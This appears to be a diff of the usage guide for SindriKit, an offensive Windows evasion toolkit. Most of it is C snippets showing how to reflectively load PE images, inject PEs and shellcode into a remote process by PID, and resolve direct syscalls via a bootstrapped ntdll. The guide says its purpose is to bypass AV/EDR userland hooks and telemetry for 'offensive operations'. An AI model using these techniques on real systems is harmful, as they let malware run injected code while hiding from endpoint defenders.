@@ -1,106 +1,216 @@
 # Basic Usage: The Core Engine
 
-SindriKit is fundamentally an extensible evasion and execution toolkit. While it currently ships with a powerful reflective loader, the loader is merely the first domain implemented on top of the toolkit's core primitives. 
+SindriKit is an extensible evasion and execution toolkit. Reflective loading and classic remote injection are **domains built on top of** shared primitives — memory, modules, process, mapping, syscalls, and execution bridges (FFI, Heaven's Gate).
 
-To use SindriKit effectively, the operator must understand how it separates offensive **Intent** (what is being accomplished) from the **Execution Mechanics** (how the OS actually executes it).
+To use the framework effectively, separate **Intent** (what you want to accomplish) from **Execution mechanics** (how the OS is contacted).
 
-## 1. Core Philosophy: The Execution Abstraction Layer
+---
 
-SindriKit forces developers to explicitly define how operations interact with the host operating system. This is achieved via a toolkit-wide Dependency Injection (DI) pattern utilizing function pointer structures such as `snd_memory_api_t` (`mem_api`) and `snd_module_api_t` (`mod_api`).
+## 1. Include hierarchy
 
-Whether reflectively loading a PE, patching ETW, or injecting into a remote process, the high-level algorithm remains entirely agnostic to the execution mechanics. The engine never calls `VirtualAlloc` or `NtAllocateVirtualMemory` directly; it calls `ctx->mem_api->alloc`. 
+| Include | Pulls in |
+|---|---|
+| `sindri.h` | Everything: common, parsers, primitives, loaders, injection |
+| `sindri/primitives.h` | Memory, modules, process, mapping, syscalls, FFI, Heaven's Gate |
+| `sindri/common.h` | Buffer, hash, status, debug, disk, string, memory helpers |
+| `sindri/loaders.h` | Reflective PE loader context and chains |
+| `sindri/injection.h` | Shared injection context and classic chains |
 
-This design means that swapping the entire operational footprint from highly visible, EDR-monitored Win32 APIs to stealthy, direct kernel syscalls is as simple as swapping a struct pointer during context initialization.
+PoCs typically include `sindri.h` plus any headers needed for explicit bootstrap (e.g. `sindri/primitives/syscalls.h`).
 
-## 2. Global State vs. Explicit Execution Primitives
+---
+
+## 2. Core philosophy: dependency injection
+
+High-level domains never call `VirtualAlloc` or `NtAllocateVirtualMemory` directly. They call through injected API tables:
+
+| Table | Examples | Used by |
+|---|---|---|
+| `snd_memory_api_t` (`mem_api`) | `snd_mem_win`, `snd_mem_nt`, `snd_mem_sys` | Loaders, local mapping |
+| `snd_module_api_t` (`mod_api`) | `snd_mod_win`, `snd_mod_nt` | Loaders, import resolution |
+| `snd_process_api_t` (`proc_api`) | `snd_proc_win`, `snd_proc_nt`, `snd_proc_sys` | Injection |
+| `snd_mapping_api_t` | `snd_map_win`, `snd_map_nt`, `snd_map_sys` | KnownDlls bootstrap |
+
+Swapping `ctx.mem_api = &snd_mem_win` to `&snd_mem_sys` changes the entire operational footprint without touching loader logic.
+
+See [Dependency injection](../architecture/dependency_injection.md) for the full pattern.
+
+---
+
+## 3. Explicit bootstrap (no implicit globals)
 
 > [!IMPORTANT]
-> Before initiating any high-level toolkit domain (like a loader or injector context), the underlying execution primitives must be explicitly bootstrapped. SindriKit does not rely on implicit global state fallbacks. The engine must be deliberately armed.
+> Syscall-backed backends (`snd_mem_sys`, `snd_proc_sys`) and the syscall resolution pipeline require **explicit initialization**. The engine does not auto-discover a clean `ntdll` base or SSN table.
 
-For example, when utilizing native execution primitives (`snd_mem_native` or `snd_mod_native`), the underlying NTDLL base must be resolved and the global syscall resolution pipeline must be configured:
+### Minimum syscall bootstrap
 
 ```c
 PVOID ntdll = NULL;
 
-// 1. Explicitly locate and map NTDLL (e.g., via KnownDlls)
-snd_status_t status = snd_map_knowndll(&snd_knowndlls_win, L"ntdll.dll", &ntdll);
-if (status.code != SND_SUCCESS) {
-    return status.os_error;
-}
+// Option A: KnownDlls (preferred for inject_pe / production syscall paths)
+status = snd_om_knowndll_map(&snd_map_nt, L"ntdll.dll", &ntdll);
 
-// 2. Feed the base address into the global execution primitive state
-snd_set_ntdll(ntdll);
+// Option B: disk load (loader_nowinapi default)
+// status = snd_disk_buffer_load("C:\\Windows\\System32\\ntdll.dll", &ntdll_buf);
+// ntdll = ntdll_buf.data;
 
-// 3. Configure the Cascading Syscall Pipeline
-snd_set_syscall_strategy(snd_hell_extract_syscall);
-snd_add_syscall_strategy(snd_halo_extract_syscall);
-snd_add_syscall_strategy(snd_tartarus_extract_syscall);
-snd_add_syscall_strategy(snd_veles_extract_syscall);
+// Option C: PEB walk (no disk I/O)
+// status = snd_peb_get_module_base_hash(SND_HASH_NTDLL_DLL, &ntdll);
+
+snd_syscall_set_ntdll(ntdll);
+snd_syscall_strategy_set(snd_syscall_resolve_ssn_scan);
+snd_syscall_strategy_add(snd_syscall_resolve_ssn_sort);
 ```
 
-By enforcing this explicit bootstrapping phase, operators retain absolute control over how the toolkit derives system service numbers (SSNs) and communicates with the kernel before any offensive operation begins.
+| Step | Purpose |
+|---|---|
+| Obtain `ntdll` base | SSN scan/sort read export stubs from this image |
+| `snd_syscall_set_ntdll` | Registers the base for all resolvers |
+| `snd_syscall_strategy_set` | Primary resolver (scan) |
+| `snd_syscall_strategy_add` | Fallback resolver (sort) |
 
-## 3. Case Studies: Standard vs. Stealth Profiles
+Even when using **`snd_mem_nt`** (in-process `ntdll` stubs, not direct syscalls), PoCs still bootstrap the pipeline so upgrading to **`snd_mem_sys`** requires no other code changes.
 
-The PoCs provided in `pocs/` demonstrate how these execution primitives are applied to the `snd_loader_ctx_t` domain to achieve vastly different OpSec profiles.
+Details: [Syscalls pipeline](../domains/primitives/syscalls/pipeline.md).
 
-### Profile A: Standard / Diagnostic (`loader_winapi`)
-This profile uses the standard, documented Win32 implementations (`snd_mem_win`, `snd_mod_win`). 
+---
+
+## 4. Loader workflow
+
+Reflective loading uses a per-technique context `snd_ldr_pe_ctx_t`:
 
 ```c
-snd_loader_ctx_t ctx = {0};
-ctx.mem_api = &snd_mem_win; // Backed by VirtualAlloc/VirtualProtect
-ctx.mod_api = &snd_mod_win; // Backed by GetModuleHandle/GetProcAddress
+snd_ldr_pe_ctx_t ctx = {0};
+ctx.mem_api    = &snd_mem_win;   // or snd_mem_nt / snd_mem_sys
+ctx.mod_api    = &snd_mod_win;   // or snd_mod_nt
+ctx.raw_source = &file_buf;      // snd_buffer_t from snd_disk_buffer_load
 
-snd_status_t status = snd_prepare_reflective_image(&ctx);
-if (status.code != SND_SUCCESS) {
-    // Inspect status.code and status.os_error for failure reasons
-    return status.os_error; 
-}
+status = snd_ldr_pe_prepare_image(&ctx);   // map, relocate, imports, protections
+if (SND_FAILED(status)) { /* handle */ }
 
-status = snd_execute_reflective_image(&ctx);
-if (status.code != SND_SUCCESS) {
-    return status.os_error;
-}
+status = snd_ldr_pe_execute_image(&ctx);   // TLS + DllMain / EXE entry (chain.c)
+if (SND_FAILED(status)) { /* handle */ }
+
+// Optional: call a named export with arbitrary args
+FARPROC fn = NULL;
+snd_ldr_pe_get_proc_address(&ctx, "MyExport", &fn);
+UINT_PTR args[] = { (UINT_PTR)0x1337 };
+UINT_PTR ret = snd_ffi_execute((PVOID)(UINT_PTR)fn, 1, args);
+
+snd_ldr_pe_detach_image(&ctx);       // after EXECUTED: DllMain/TLS detach + free (local only)
+snd_ldr_pe_free_mapped_image(&ctx);  // free if detach was skipped or already partially cleaned
+snd_buffer_free(&file_buf);
 ```
-**OpSec Impact:** This profile provides maximum stability and straightforward debugging, but acts as an absolute flare to AV/EDR. Every memory operation directly triggers userland inline hooks inside `ntdll.dll`. It is intended strictly for diagnostic scenarios.
 
-### Profile B: Stealth / Decoupled (`loader_nowinapi`)
-This profile entirely drops the Win32 API layer in favor of direct, dynamic kernel interaction.
+**Execution bridge:** `snd_ffi_execute` (`include/sindri/primitives/ffi.h`) is the public API for calling resolved exports with unknown signatures. See [FFI](../domains/primitives/execution/ffi.md).
+
+---
+
+## 5. Injection workflow
+
+Injection uses a **shared** context `snd_inj_ctx_t` across classic techniques (unlike loaders, where each technique owns its own loader context):
 
 ```c
-snd_loader_ctx_t ctx = {0};
-ctx.mem_api = &snd_mem_native; // Backed by Direct Syscalls
-ctx.mod_api = &snd_mod_native; // Backed by Manual PEB Walking
+snd_ldr_pe_ctx_t ldr_ctx = {0};  // local bake
+snd_inj_ctx_t    inj_ctx = {0};  // remote target
 
-// ... (Requires the global syscall bootstrapping shown in Section 2)
+ldr_ctx.mem_api    = &snd_mem_sys;
+ldr_ctx.mod_api    = &snd_mod_nt;
+ldr_ctx.raw_source = &file_buf;
 
-snd_status_t status = snd_prepare_reflective_image(&ctx);
-if (status.code != SND_SUCCESS) {
-    return status.os_error; 
-}
+inj_ctx.target_pid = target_pid;
+inj_ctx.proc_api   = &snd_proc_sys;
 
-status = snd_execute_reflective_image(&ctx);
-if (status.code != SND_SUCCESS) {
-    return status.os_error;
-}
+status = snd_inj_classic_pe(&ldr_ctx, &inj_ctx);   // PE map + remote execute
+// or: snd_inj_classic_shell(&inj_ctx) with inj_ctx.payload set
+
+snd_inj_cleanup(&inj_ctx);
 ```
-**OpSec Impact:** By injecting the `native` primitives, the loader utilizes the cascading syscall strategy to invoke `NtAllocateVirtualMemory` and `NtProtectVirtualMemory` directly. Crucially, the toolkit relies entirely on the `ntdll` base explicitly bootstrapped (e.g., via KnownDlls or custom mapping) rather than trusting the host's PEB state. This bypasses userland telemetry and API string artifacts, forming the baseline requirement for modern offensive operations.
 
-## 4. Architectural Extensibility
-
-Because the Dependency Injection and explicit primitive bootstrapping are generalized across the entire framework, SindriKit natively scales to future domains.
-
-In the future, when initializing a `snd_injector_ctx_t` (for remote process injection) or a `snd_spoof_ctx_t` (for call stack spoofing), the operator follows the exact same paradigm:
+Shellcode-only injection skips the loader context:
 
 ```c
-// Future Extensibility Example:
-snd_injector_ctx_t inj_ctx = {0};
-inj_ctx.mem_api = &snd_mem_native; 
-inj_ctx.target_pid = 1337;
+snd_inj_ctx_t inj_ctx = {0};
+inj_ctx.proc_api   = &snd_proc_win;
+inj_ctx.target_pid = pid;
+inj_ctx.payload    = &shellcode_buf;
 
-// Uses the previously configured Hell's Gate / Halo's Gate cascading pipeline
-snd_execute_injection(&inj_ctx);
+status = snd_inj_classic_shell(&inj_ctx);
+snd_inj_cleanup(&inj_ctx);
 ```
 
-By decoupling "Intent" from "Execution Mechanics", SindriKit ensures that stealth primitives are configured only once. Every subsequent module, toolkit domain, and offensive capability inherently inherits the chosen OpSec profile.
+---
+
+## 6. OpSec profiles (PoC mapping)
+
+| Profile | PoC | Memory | Modules | Process | Syscall bootstrap |
+|---|---|---|---|---|---|
+| Diagnostic | `loader_winapi` | `snd_mem_win` | `snd_mod_win` | — | Optional |
+| NT stubs | `loader_nowinapi` | `snd_mem_nt` | `snd_mod_nt` | — | Required (disk `ntdll`) |
+| Direct syscalls | `inject_pe` | `snd_mem_sys` | `snd_mod_nt` | `snd_proc_sys` | Required (KnownDlls) |
+| CRT-less | `loader_noCRT_nowinapi` | `snd_mem_win` | `snd_mod_nt` | — | Minimal |
+| Shellcode inject | `inject_shell` | — | — | `snd_proc_win` | Yes (KnownDlls; unused while `_win`) |
+| WoW64 x64 exec | `heavens_gate` | Win32 demo alloc | — | — | N/A |
+
+Full walkthroughs: [Examples](../examples/README.md).
+
+### Profile A — Win32 (`loader_winapi`)
+
+```c
+snd_ldr_pe_ctx_t ctx = {0};
+ctx.mem_api = &snd_mem_win;
+ctx.mod_api = &snd_mod_win;
+// prepare → execute → optional snd_ffi_execute for -e export
+```
+
+Maximum stability; every memory operation hits hooked userland stubs.
+
+### Profile B — NT API (`loader_nowinapi`)
+
+```c
+// Bootstrap (Section 3), then:
+ctx.mem_api = &snd_mem_nt;
+ctx.mod_api = &snd_mod_nt;
+```
+
+Avoids `VirtualAlloc` / `LoadLibrary` telemetry; calls still pass through in-process `ntdll` where hooks may fire.
+
+### Profile C — Direct syscalls (`inject_pe`)
+
+```c
+snd_om_knowndll_map(&snd_map_nt, L"ntdll.dll", &ntdll);
+snd_syscall_set_ntdll(ntdll);
+snd_syscall_strategy_set(snd_syscall_resolve_ssn_scan);
+snd_syscall_strategy_add(snd_syscall_resolve_ssn_sort);
+
+ldr_ctx.mem_api = &snd_mem_sys;
+ldr_ctx.mod_api = &snd_mod_nt;
+inj_ctx.proc_api = &snd_proc_sys;
+snd_inj_classic_pe(&ldr_ctx, &inj_ctx);
+```
+
+Bypasses userland hooks for local syscall memory ops and remote process manipulation.
+
+---
+
+## 7. Status handling
+
+All domain functions return `snd_status_t`. Use `SND_SUCCEEDED` / `SND_FAILED` macros:
+
+```c
+if (SND_FAILED(status)) {
+    snd_status_print(status);  // meaningful when SND_ENABLE_DEBUG=ON
+    return status.code;
+}
+```
+
+See [Status system](../architecture/status_system.md) and [Common status API](../common/api_reference.md#status-sindricommonstatush).
+
+---
+
+## Next steps
+
+- [Building SindriKit](building.md) — CMake options, CRT-less tiers, first PoC build
+- [Loaders domain](../domains/loaders/README.md)
+- [Injection domain](../domains/injection/README.md)
+- [Execution primitives](../domains/primitives/execution/README.md)
